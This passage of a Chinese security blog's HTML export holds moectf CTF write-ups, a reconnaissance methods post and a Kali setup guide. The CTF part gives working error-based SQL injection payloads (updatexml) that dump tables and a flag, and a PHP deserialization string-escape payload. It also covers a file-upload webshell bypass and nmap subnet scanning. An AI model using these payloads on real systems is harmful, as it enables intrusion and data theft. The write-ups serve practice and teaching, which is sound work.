 <span class="hljs-comment"># 不知道为什么6次不行</span><br>        response = session.post(url, data=data1)<br>        <span class="hljs-built_in">print</span>(response.text)<br>        <span class="hljs-keyword">match</span> = re.search(pattern, response.text)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>:<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>) == <span class="hljs-string">&quot;向左&quot;</span>:<br>                control=<span class="hljs-number">1</span><br>            <span class="hljs-keyword">elif</span> <span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>)==<span class="hljs-string">&quot;向右&quot;</span>:<br>                control=-<span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                control=<span class="hljs-number">0</span><br>            <br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>)==<span class="hljs-string">&quot;抓地力太小了！&quot;</span>:<br>                throttle=<span class="hljs-number">0</span><br>            <span class="hljs-keyword">elif</span> <span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>)==<span class="hljs-string">&quot;抓地力太大了！&quot;</span>:<br>                throttle=<span class="hljs-number">2</span><br>            <span class="hljs-keyword">else</span>:<br>                throttle=<span class="hljs-number">1</span>    <br>            data1 = &#123;<span class="hljs-string">&#x27;driver&#x27;</span>:<span class="hljs-string">&#x27;august&#x27;</span>,<span class="hljs-string">&#x27;steering_control&#x27;</span>: control, <span class="hljs-string">&#x27;throttle&#x27;</span>: throttle&#125;<br>            <span class="hljs-comment"># print(f&quot;output:&#123;match.group(1)&#125;,&#123;match.group(2)&#125;\n&#123;control&#125;,&#123;throttle&#125;&quot;)</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;error&quot;</span>)<br>            <span class="hljs-keyword">break</span>    <br><br><span class="hljs-comment"># response = session.post(url, data=data1)</span><br><span class="hljs-comment"># print(response.text)</span><br><br></code></pre></td></tr></table></figure><p>然后注意看打印 的信息就好了</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230911094415511.png" alt="image-20230911094415511"></p><h2 id="moe图床"><a href="#moe图床" class="headerlink" title="moe图床"></a>moe图床</h2><p>简单的上传漏洞</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230911094723479.png" alt="image-20230911094723479"></p><p>0x01</p><p>我们先试一下，上传php</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230911094754612.png" alt="image-20230911094754612"></p><p>并不行，这道题的基本思路就是上传php，通过蚁剑等工具连接</p><p>既然php后缀不行，我首先想到的是，后缀绕过法</p><p>0x02</p><p>直到使用下面这个格式可以</p><h2 id="大海捞针"><a href="#大海捞针" class="headerlink" title="大海捞针"></a>大海捞针</h2><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230911104057204.png" alt="image-20230911104057204"></p><p>就直接爆破就好了</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230911104429696.png" alt="image-20230911104429696"></p><p>然后分析出最特殊的哪一个，然后经行搜索</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230911104752570.png" alt="image-20230911104752570"></p><h2 id="meo图床"><a href="#meo图床" class="headerlink" title="meo图床"></a>meo图床</h2><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230920000027358.png" alt="image-20230920000027358"></p><p>0x01</p><p>尝试上传图片</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230920000553743.png" alt="image-20230920000553743"></p><p>上传成功</p><p>尝试抓包，看什么情况</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230920001213659.png" alt="image-20230920001213659"></p><h2 id="夺命十三枪"><a href="#夺命十三枪" class="headerlink" title="夺命十三枪"></a>夺命十三枪</h2><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230920001247132.png" alt="image-20230920001247132"></p><p>0x01</p><p>我们可以直接访问到</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230920001318716.png" alt="image-20230920001318716"></p><p>访问看看什么情况</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230920001409398.png" alt="image-20230920001409398"></p><p>这样的，我们可以分析得到，只要将Spear_Owner&#x3D;MaoLei就好了</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230920001459028.png" alt="image-20230920001459028"></p><p>然后怎么构造呢？</p><p>0x02</p><p>这个函数会缩短和变长，所以我们尝试使用他构造我们的参数</p><p>原理如下：</p><p>序列化的长度是不会变的，但是我们的函数会改变他的长度，所以如果我们将我们的参数前面边长，当和序列化的长度一致的时候，如果又“};”就会被截断，达到我们传参的目的</p><p>因为我们需要将这段换成我们需要的MaoLei，我们只能通过传参的方式将我们的想法传进去，所以这个时候，尝试让前面变长</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230920004305889.png" alt="image-20230920004305889"></p><p>利用上面的长度，重新构造成新的</p><blockquote><p>di_jiu_qiangdi_shi_san_qiangdi_shi_san_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiang”;s:11:”Spear_Owner”;s:6:”MaoLei”;}</p></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230920005005478.png" alt="image-20230920005005478"></p><h2 id="出去旅游的新海"><a href="#出去旅游的新海" class="headerlink" title="出去旅游的新海"></a>出去旅游的新海</h2><p>0x01</p><p>首先对这个分析，直接F12</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/image-20230921204239086.png" alt="image-20230921204239086"></p><p>看到一个php，点开它</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/image-20230921204334075.png" alt="image-20230921204334075"></p><p>可以看到一个这个函数，可以知道他是显错注入</p><p>0x02</p><p>通过updatexml函数查询，具体的数据</p><p>0x03</p><p>查询当前数据库的所有的表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">ip=1&amp;user_agent=1&amp;time=1 and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)<br></code></pre></td></tr></table></figure><p>0x04</p><p>查询secret_of_kokomi表的字段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">ip=1&amp;user_agent=1&amp;time=1 and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name= &#x27;secret_of_kokomi&#x27;),0x7e),1)<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230921205724283.png" alt="image-20230921205724283"></p><p>0x05</p><p>开始爆破数据</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230921210653591.png" alt="image-20230921210653591"></p><blockquote><p>ip&#x3D;1&amp;user_agent&#x3D;1&amp;time&#x3D;1 and updatexml(1,substring(concat(0x7e,(select group_concat(content,0x7e,id) from secret_of_kokomi)),30,40),1)</p></blockquote><p>完整的flag是</p><blockquote><p>moectf{Dig_Thr0ugh_Eve2y_C0de_3nd_Poss1bIlIti3s!!}</p></blockquote><h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="Reverse入门指北"><a href="#Reverse入门指北" class="headerlink" title="Reverse入门指北"></a>Reverse入门指北</h2><p>0x01</p><p>将exe文件放入ida然后查看string 即可</p><h2 id="base-64"><a href="#base-64" class="headerlink" title="base_64"></a>base_64</h2><p>0x01</p><p>解压文件发现是一个.pyc 文件，所以我们放入反编译的网站</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230911105228213.png" alt="image-20230911105228213"></p><p>0x02</p><p>可以得出，使用str1，换一个string2码表</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230911110209718.png" alt="image-20230911110209718"></p><h2 id="Xor"><a href="#Xor" class="headerlink" title="Xor"></a>Xor</h2><p>0x01 </p><p>放入ida之后发现，分析就是一个简单的异或加密</p><p>0x02</p><p>将enc异或就好了</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230911111155805.png" alt="image-20230911111155805"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230911111207923.png" alt="image-20230911111207923"></p><p>0x03</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230911111320211.png" alt="image-20230911111320211"></p><h2 id="UPX"><a href="#UPX" class="headerlink" title="UPX!"></a>UPX!</h2><p>忘记了可以先看这个</p><p><a href="https://blog.csdn.net/weixin_39190897/article/details/115592095">CTF逆向-Upx脱壳攻防世界simple unpack_ctf upx逆向_Tr0e的博客-CSDN博客</a></p><p>0x01</p><p>所以我们就可以先放入wsl-kali里进行脱壳，然后，再放入ida里面</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230911111955537.png" alt="image-20230911111955537"></p><p>0x02</p><p>我们通过string找到主要的函数</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230911112024117.png" alt="image-20230911112024117"></p><p>0x03</p><p>这个也是一个异或加密</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230911113103047.png" alt="image-20230911113103047"></p><p>就是请注意，如果是0x00使用chr的话，可能会只有一个0，所以需要人工的补上</p><h2 id="RRRRRc4"><a href="#RRRRRc4" class="headerlink" title="RRRRRc4"></a>RRRRRc4</h2><p>由名字可见这个是RC4加密，我们只需要找到对应的密钥和密文就好了</p><p>0x01</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230911130441753.png" alt="image-20230911130441753"></p><p>红色部分是加密部分</p><p>蓝色部分是密文，我们将它换成16进制字符串</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230911130538113.png" alt="image-20230911130538113"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">a=[<span class="hljs-number">0x1B</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0xB5</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0xF3</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0xB6</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x8A</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0xCF</span>, <span class="hljs-number">0xF3</span>, <span class="hljs-number">0xAE</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0xB2</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>]<br><br>temp=<span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">for</span> i  <span class="hljs-keyword">in</span> a:<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(<span class="hljs-built_in">hex</span>(i)[<span class="hljs-number">2</span>:])==<span class="hljs-number">1</span> :<br>        temp+=<span class="hljs-string">&#x27;0&#x27;</span><br>    temp+=<span class="hljs-built_in">hex</span>(i)[<span class="hljs-number">2</span>:] <br>        <br><span class="hljs-built_in">print</span>(temp) <br></code></pre></td></tr></table></figure><p>0x02</p><p>然后将密文放入解密就行了</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230911130710023.png" alt="image-20230911130710023"></p><h2 id="SMC"><a href="#SMC" class="headerlink" title="SMC"></a>SMC</h2><p>可以通过名字可以看出这个是SMC加密</p><p>0x01</p><p>然后然后IDA分析</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230912132154868.png" alt="image-20230912132154868"></p><p>这个函数就是加密的函数，点进去看看是怎么加密的</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230912132450529.png" alt="image-20230912132450529"></p><p>可以看到加密的地址是0x4014d0</p><p>然后长度是122</p><p>0x02</p><p>通过加密的逆操作，得出答案</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">start=<span class="hljs-number">0x4014D0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">122</span>):<br>    patch_byte(start+i,Byte(start+i)^<span class="hljs-number">0x66</span>)<br><br>start=<span class="hljs-number">0x4014d0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">122</span>):<br>    patch_byte(start+i,Byte(start+i)^<span class="hljs-number">0x66</span>)<br></code></pre></td></tr></table></figure><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="Misc-入门指北"><a href="#Misc-入门指北" class="headerlink" title="Misc 入门指北"></a>Misc 入门指北</h2><p>下载完了，以后你就可以发现存在密码</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230921221532421.png" alt="image-20230921221532421"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230921221503407.png" alt="image-20230921221503407"></p><h2 id="打不开的图片1"><a href="#打不开的图片1" class="headerlink" title="打不开的图片1"></a>打不开的图片1</h2><p>0x01</p><p>看名字发现可能和文件头有关</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230921221921193.png" alt="image-20230921221921193"></p><p>0x02</p><p>在图片的属性里面找到主题，然后解码，就行<br><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectfimage-20231004005924801.png" alt="image-20231004005924801"></p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF比赛记录</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>信息收集方法集合</title>
    <link href="/2023/09/04/%E6%B8%97%E9%80%8F/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%96%B9%E6%B3%95%E9%9B%86%E5%90%88/"/>
    <url>/2023/09/04/%E6%B8%97%E9%80%8F/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%96%B9%E6%B3%95%E9%9B%86%E5%90%88/</url>
    
    <content type="html"><![CDATA[<h1 id="域名收集"><a href="#域名收集" class="headerlink" title="域名收集"></a>域名收集</h1><h2 id="whois"><a href="#whois" class="headerlink" title="whois"></a>whois</h2><ol><li><p>whois</p><p>可以查到注册人的相关信息</p><ul><li><p>接口查询</p><p><a href="https://whois.aliyun.com/">https://whois.aliyun.com/</a>  </p><p><a href="https://www.whois365.com/cn/">https://www.whois365.com/cn/</a>  </p><p><a href="http://whois.chinaz.com/">http://whois.chinaz.com/</a>  </p></li><li><p>python脚本查询</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br>     <br>domain = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;input domain: &quot;</span>)<br>     <br>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>s.connect((<span class="hljs-string">&#x27;whois.internic.net&#x27;</span>, <span class="hljs-number">43</span>))<br>s.send(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;domain&#125;</span>\r\n&#x27;</span>.encode())<br>     <br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    v = s.recv(<span class="hljs-number">1024</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> v:<br>        <span class="hljs-keyword">break</span><br>    decoded = v.decode()<br>    <span class="hljs-built_in">print</span>(decoded)<br>     <br>s.close()<br><br></code></pre></td></tr></table></figure></li></ul></li><li><p>whois反查</p><blockquote><p><a href="https://whois.chinaz.com/">https://whois.chinaz.com/</a></p></blockquote><p>  域名反查：<a href="https://whois.chinaz.com/reverse?ddlSearchMode=0">https://whois.chinaz.com/reverse?ddlSearchMode=0</a></p><p>  邮箱反查：<a href="https://whois.chinaz.com/reverse?ddlSearchMode=1">https://whois.chinaz.com/reverse?ddlSearchMode=1</a></p><p>  注册人反查：<a href="https://whois.chinaz.com/reverse?ddlSearchMode=2">https://whois.chinaz.com/reverse?ddlSearchMode=2</a></p><p>  电话反查：<a href="https://whois.chinaz.com/reverse?ddlSearchMode=3">https://whois.chinaz.com/reverse?ddlSearchMode=3</a></p></li></ol><h2 id="备案信息"><a href="#备案信息" class="headerlink" title="备案信息"></a>备案信息</h2><p><a href="https://beian.miit.gov.cn/">https://beian.miit.gov.cn/</a></p><h2 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集"></a>子域名收集</h2><ol><li><p>googleHacking</p></li><li><p>site:hetianlab.com</p></li><li><p>fofa</p></li><li><p>鹰图</p></li><li><p>SSL证书查询</p><p> <a href="https://crt.sh/">https://crt.sh/</a></p></li></ol><h1 id="IP信息收集"><a href="#IP信息收集" class="headerlink" title="IP信息收集"></a>IP信息收集</h1><ol><li><p>IP反查</p><p>  <a href="http://stool.chinaz.com/same">http://stool.chinaz.com/same</a>  </p><p>如果发现正在渗透的主机是一台虚拟机，我们可以考虑反查域名，获得运行在这台主机上的其他的虚拟机或者服务器，我们就可以尝试获得其他服务器的权限，迂回得到权限</p></li><li><p>域名反查</p><p>  <a href="http://ip.tool.chinaz.com/">http://ip.tool.chinaz.com/</a>  </p><p>知道一个站点的域名需要得到它的IP以便之后获取端口信息或扫描等后续工作</p></li><li><p>C端存活</p><blockquote><p>  nmap -sP <a href="http://www.xxx.com/24">www.XXX.com/24</a>  </p><p>  nmap -sP 192.168.1.*  </p></blockquote><p>也可以使用yakit</p></li></ol><h1 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h1><ol><li><p>多地Ping</p><p>  <a href="http://ping.chinaz.com/">http://ping.chinaz.com/</a>  </p></li><li><p>国外访问</p><p>  <a href="https://ping.eu/ping/">https://ping.eu/ping/</a>  </p></li><li><p>CDN绕过</p><ul><li><p>查询子域名的IP</p><p>  <a href="https://ip.tool.chinaz.com/ipbatch">https://ip.tool.chinaz.com/ipbatch</a></p></li></ul></li></ol><h1 id="端口收集"><a href="#端口收集" class="headerlink" title="端口收集"></a>端口收集</h1><p>黑客常用的端口</p><p><a href="https://www.cnblogs.com/bmjoker/p/8833316.html">https://www.cnblogs.com/bmjoker/p/8833316.html</a> </p><h1 id="网站信息收集"><a href="#网站信息收集" class="headerlink" title="网站信息收集"></a>网站信息收集</h1><ol><li><p>操作系统信息收集</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20230908205706352.png" alt="image-20230908205706352"></p></li><li><p>网站类型</p></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>环境准备</title>
    <link href="/2023/09/03/%E6%B8%97%E9%80%8F/%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/"/>
    <url>/2023/09/03/%E6%B8%97%E9%80%8F/%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87image-20230903000210232.png" alt="image-20230903000210232"></p><p>流程</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87image-20230903000406861.png" alt="image-20230903000406861"></p><h2 id="环境安装"><a href="#环境安装" class="headerlink" title="环境安装"></a>环境安装</h2><h3 id="WIN-JAVA"><a href="#WIN-JAVA" class="headerlink" title="WIN-JAVA"></a>WIN-JAVA</h3><h4 id="JDK8"><a href="#JDK8" class="headerlink" title="JDK8"></a>JDK8</h4><p>下载 JDK8:  <a href="https://www.oracle.com/java/technologies/javase-jdk8-downloads.html">https://www.oracle.com/java/technologies/javase-jdk8-downloads.html</a>  </p><p>主要就是使用的是JDK8</p><h3 id="WIN-PYTHON"><a href="#WIN-PYTHON" class="headerlink" title="WIN-PYTHON"></a>WIN-PYTHON</h3><ol><li><p>下载安装程序</p><blockquote><p>  <a href="https://www.python.org/downloads/">https://www.python.org/downloads/</a>  </p><p><a href="https://www.python.org/ftp/python/">https://www.python.org/ftp/python/</a></p></blockquote></li></ol><h3 id="KALI安装"><a href="#KALI安装" class="headerlink" title="KALI安装"></a>KALI安装</h3><p>直接在官网下载，建议使用VM虚拟机</p><h4 id="设置中文"><a href="#设置中文" class="headerlink" title="设置中文"></a>设置中文</h4><p>安装中文</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt-get install xfonts-intl-chinese<br>sudo apt-get install ttf-wqy-microhei<br><br></code></pre></td></tr></table></figure><p>配置语言</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo dpkg-reconfigure locales<br></code></pre></td></tr></table></figure><p>重启</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">reboot<br></code></pre></td></tr></table></figure><h4 id="kali-java"><a href="#kali-java" class="headerlink" title="kali-java"></a>kali-java</h4><h5 id="JDK8-1"><a href="#JDK8-1" class="headerlink" title="JDK8"></a>JDK8</h5><p>下面是8U161的安装过程</p><ol><li><p>创建目录，解压文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo <span class="hljs-built_in">mkdir</span> -p /usr/local/java<br>sudo <span class="hljs-built_in">cp</span> jdk-8u161-linux-x64.tar.gz /usr/local/java<br><span class="hljs-built_in">cd</span> /usr/local/java<br>sudo tar xzvf jdk-8u91-linux-x64.tar.gz<br>   <br></code></pre></td></tr></table></figure></li><li><p>通知系统JAVA的位置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo update-alternatives --install <span class="hljs-string">&quot;/usr/bin/java&quot;</span> <span class="hljs-string">&quot;java&quot;</span> <span class="hljs-string">&quot;/usr/local/java/jdk1.8.0_161/bin/java&quot;</span> 1112<br>sudo update-alternatives --install <span class="hljs-string">&quot;/usr/bin/javac&quot;</span> <span class="hljs-string">&quot;javac&quot;</span> <span class="hljs-string">&quot;/usr/local/java/jdk1.8.0_161/bin/javac&quot;</span> 1112<br>   <br></code></pre></td></tr></table></figure></li><li><p>设置默认的java位置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo update-alternatives --<span class="hljs-built_in">set</span> java /usr/local/java/jdk1.8.0_161/bin/java<br>sudo update-alternatives --<span class="hljs-built_in">set</span> javac /usr/local/java/jdk1.8.0_161/bin/javac<br>   <br></code></pre></td></tr></table></figure></li></ol><h5 id="JDK11"><a href="#JDK11" class="headerlink" title="JDK11"></a>JDK11</h5><p>JDK可以直接包管理器安装</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">apt search openjdk<br>apt install openjdk-11-jdk<br><br></code></pre></td></tr></table></figure><p>然后安装上面的步骤通知系统</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/image-20230903164058773.png" alt="image-20230903164058773"></p><h4 id="kali-python"><a href="#kali-python" class="headerlink" title="kali-python"></a>kali-python</h4><h5 id="python2"><a href="#python2" class="headerlink" title="python2"></a>python2</h5><p>由于python2是kali 自己就会安装所以不需要重新安装</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/image-20230903164305977.png" alt="image-20230903164305977"></p><p>我们只需要安装pythoon2就可以了</p><h5 id="python3-8"><a href="#python3-8" class="headerlink" title="python3.8"></a>python3.8</h5><p>安装Python所需要的依赖</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span 